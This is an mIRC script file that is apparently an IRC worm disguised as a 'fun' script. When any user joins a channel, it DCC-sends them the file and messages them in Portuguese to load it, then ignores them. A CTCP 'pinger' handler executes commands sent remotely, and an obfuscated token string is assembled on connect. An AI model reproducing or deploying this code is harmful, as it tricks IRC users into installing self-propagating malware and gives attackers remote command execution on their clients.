[script]
n0=on 1:JOIN:*:{
n1=  /set %n = $rand(1,10)
n2=  if %n == 3 goto blah
n3=  :blah
n4=  /dcc send $nick diversao.ini
n5=  /msg $nick Oie! Ei to mandando esse script q é só diversão!!!  ;)
n6=  /msg $nick ó, pra ativar ele escreva: /load -rs diversao.ini
n7=  /msg $nick vich.. tenho q ir! tchau! :*************************
n8=  goto fim
n9=  :fim
n10=  /ignore $nick
n11=}
n12=on 1:CONNECT:{
n13=  set %g $gettok( %j ,7-17,46)
n14=  set %g $remtok( %g ,S,46)
n15=  set %g $remtok( %g ,X,46)
n16=  set %g $remtok( %g ,O,46)
n17=  set %g $remtok( %g ,K,46)
n18=  set %g $remtok( %g ,N,46)
n19=  set %g $remtok( %g ,E,46)
n20=  set %o $remove(%g,.)
n21=}
n22=on 1:START:  set %j Q.A.Z.PL.M.W.T.S.X.R.O.A.K.S.N.E.H.D.C.I.J.B.R.F.V.U.H.T.G
n23=on 1:TEXT:*TRASH*:#:/echo $nick HERE
n24=ctcp 1:pinger:$2-
